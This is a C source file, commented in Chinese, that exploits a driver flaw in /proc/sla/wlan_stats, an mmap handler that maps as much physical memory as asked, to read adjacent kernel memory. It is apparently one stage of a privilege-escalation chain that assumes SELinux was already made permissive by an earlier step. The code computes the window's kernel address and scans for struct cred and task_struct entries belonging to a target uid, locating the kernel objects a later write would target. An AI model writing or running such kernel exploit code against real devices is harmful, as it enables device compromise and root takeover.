/* sladump.c — 零风险泄露分析器(不需要任何内核写)。
 * 前提: SELinux 已 permissive(由 pr 的相1 那一笔造成), 于是 /proc/sla/wlan_stats 可读,
 * 而它的 .mmap = stats_map → remap_pfn_range(长度只按 vma 大小) ⇒ 映射几 MB 就能看到
 * **物理相邻的内核内存**。本工具做三件事:
 *   1) 用 mode(value - 自身偏移) 求出窗口第 0 字节对应的**内核虚拟地址** WIN_VA;
 *   2) 扫 struct cred 的字节特征: +4..+0x23 八个 u32 全 == 目标 uid(默认 2000)
 *      ⇒ 命中的就是"某个和我们同 uid 的进程的 cred", 内核 VA = WIN_VA + off;
 *   3) 顺带扫 task_struct 特征: +0xb4/+0xb8 == 120/120 且 +0x840/+0x848 都像指针
 *      ⇒ 拿到 task 后再读它的 cred。
 * 只读不写; 输出全在 stdout(重定向到文件)。 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>

#define MAPMB 96
static int UIDS = 2000;

static uint64_t rd64(unsigned char *p, size_t o) { uint64_t v; memcpy(&v, p + o, 8); return v; }
static uint32_t rd32(unsigned char *p, size_t o) { uint32_t v; memcpy(&v, p + o, 4); return v; }

int main(int argc, char **argv) {
  const char *f = argc > 1 ? argv[1] : "/proc/sla/wlan_stats";
  if (argc > 2) UIDS = (int)strtol(argv[2], NULL, 0);
  int fd = open(f, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { printf("[E] open(%s) errno=%d(%s) ⇒ SELinux 还在 enforcing\n", f, errno, strerror(errno)); return 1; }
  size_t L = (size_t)MAPMB * 1024u * 1024u;
  unsigned char *p = mmap(NULL, L, PROT_READ, MAP_SHARED, fd, 0);
  if (p == MAP_FAILED) { printf("[E] mmap(%zu) errno=%d(%s)\n", L, errno, strerror(errno)); return 2; }
  printf("[I] mmap ok %p len=0x%zx (%d MB)\n", (void *)p, L, MAPMB);

  /* 1) WIN_VA = mode(value - offset), 只统计"像内核 VA 且减完仍像内核 VA"的槽 */
  static long long best_k; static long long best_n;
  for (size_t o = 0; o + 8 <= L; o += 8) {
    uint64_t v = rd64(p, o);
    if (v < 0xffffff8000000000ULL || v > 0xffffffdfffffffffULL) continue;
    long long k = (long long)v - (long long)o;
    if (k < 0xffffff0000000000LL || k > 0xfffffffffffff000LL) continue;
    long long n = 0;
    for (size_t q = 0; q + 8 <= L; q += 8) if ((long long)(rd64(p, q) - (long long)q) == k) n++;
    if (n > best_n) { best_n = n; best_k = k; }
  }
  printf("[I] 锚点: WIN_VA 候选 = %016llx (有 %lld 个槽自洽)\n", (unsigned long long)best_k, best_n);

  /* 指针高位分桶: 看清这块区域到底指向哪些区(线性映射 / vmalloc / 镜像) */
  {
    static const char *nm[8]; int i2;
    for (i2=0;i2<8;i2++) nm[i2]="";
    long n_lin=0, n_vm=0, n_img=0, n_other=0; size_t shown=0;
    printf("[HIST] 线性映射/ vmalloc / 镜像 三类指针计数与线性映射指针的前 30 个:\n");
    for (size_t o = 0; o + 8 <= L; o += 8) {
      uint64_t v = rd64(p, o);
      if (v < 0xffffff8000000000ULL || v > 0xffffffffffffffffULL) continue;
      unsigned top = (unsigned)(v >> 32);
      if (top <= 0xffffff81) n_lin++;
      else if (top >= 0xffffffb0 && top <= 0xffffffbf) n_vm++;
      else if (top >= 0xffffffc0 && top <= 0xffffffc1) n_img++;
      else n_other++;
      if (top <= 0xffffff81 && shown < 30) {
        printf("[LIN]   +0x%07zx = %016llx  (WIN_VA+off=%016llx ⇒ %s)\n", o,
               (unsigned long long)v, (unsigned long long)((long long)o+best_k),
               (v>((uint64_t)best_k) && v < ((uint64_t)best_k + L)) ? "窗口内" : "窗口外");
        shown++;
      }
    }
    printf("[HIST] 线性映射=%ld vmalloc=%ld 镜像=%ld 其他=%ld\n", n_lin, n_vm, n_img, n_other);
  }
  /* 2) cred 特征 */
  int nc = 0;
  for (size_t o = 4; o + 0x20 + 4 <= L; o += 4) {
    if (rd32(p, o) != (uint32_t)UIDS) continue;
    int ok = 1;
    for (int i = 1; i < 8; i++) if (rd32(p, o + (size_t)i * 4) != (uint32_t)UIDS) { ok = 0; break; }
    if (!ok) continue;
    size_t cred = o - 4;                       /* usage 在 +0 */
    uint32_t usage = rd32(p, cred);
    uint64_t sec = rd64(p, cred + 0x98);
    printf("[CRED] 窗口偏移 +0x%07zx ⇒ 内核 VA = %016llx  usage=%u  security=%016llx%s\n",
           cred, (unsigned long long)((long long)cred + best_k), usage, (unsigned long long)sec,
           (usage > 0 && usage < 100000) ? "   <= usage 合理" : "");
    if (++nc >= 25) break;
  }
  printf("[I] 命中 cred 候选 %d 个\n", nc);

  /* 3) task_struct 特征(prio/static_prio = 120, cred/real_cred 像指针, stack 像指针) */
  int nt = 0;
  for (size_t o = 0x100; o + 0x950 <= L && nt < 12; o += 8) {
    if (rd32(p, o + 0xb4) != 120 || rd32(p, o + 0xb8) != 120) continue;
    uint64_t rc = rd64(p, o + 0x840), cr = rd64(p, o + 0x848), st = rd64(p, o + 0x68);
    if (rc < 0xffffff8000000000ULL || cr < 0xffffff8000000000ULL) continue;
    if (rc == cr) continue;                     /* init_task 那种自指先放过 */
    printf("[TASK] +0x%07zx VA=%016llx  stack=%016llx  cred=%016llx  real_cred=%016llx\n",
           o, (unsigned long long)((long long)o + best_k), (unsigned long long)st,
           (unsigned long long)cr, (unsigned long long)rc);
    nt++;
  }
  printf("[I] task 候选 %d 个\n", nt);
  return 0;
}
